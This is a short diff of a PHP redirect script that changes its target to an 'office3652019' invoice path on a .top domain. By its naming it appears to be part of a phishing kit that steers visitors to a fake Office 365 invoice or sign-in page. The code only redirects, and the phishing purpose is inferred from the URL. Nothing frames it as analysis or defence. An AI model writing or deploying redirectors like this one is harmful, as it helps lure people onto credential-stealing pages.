@@ -11,7 +11,7 @@ function Redirect($url, $permanent = false)
  exit();
 }
 
-Redirect("https://invoice.barloballonvaarten.top/office3652019?
+Redirect("https://barloballonvaarten.top/invoice/office3652019/index.php?
 ", false);
 
 ?>
